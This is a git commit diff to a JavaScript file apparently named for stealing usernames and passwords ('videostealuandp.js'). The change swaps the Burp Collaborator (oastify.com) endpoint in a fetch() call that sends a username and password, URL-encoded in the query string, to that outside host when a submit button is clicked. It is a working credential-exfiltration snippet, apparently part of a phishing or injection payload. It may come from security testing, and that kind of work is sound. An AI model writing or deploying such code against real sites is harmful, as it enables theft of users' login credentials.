195893ef7518effb9f8aab00307ce3e8ebdfabd8
vulnoob <200810511+vulnoob@users.noreply.github.com>
2025-09-15 13:32:22 -0500

    Update videostealuandp.js

--- videostealuandp.js
+++ videostealuandp.js
@@ -25,7 +25,7 @@ function sendData() {
         return;
     }
 
-    fetch(`https://j7rawf5qtp7gb6i75afqgpko3f96xx0lp.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
+    fetch(`https://axbcuurunny0dsoikvk07vk8wz2qqhe6.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
         .then(response => response.text())
         .then(data => {
             console.log("Response from server:", data);
@@ -38,5 +38,6 @@ function sendData() {
 }
 
 document.getElementById('submitBtn').addEventListener('click', sendData);
+
 
 
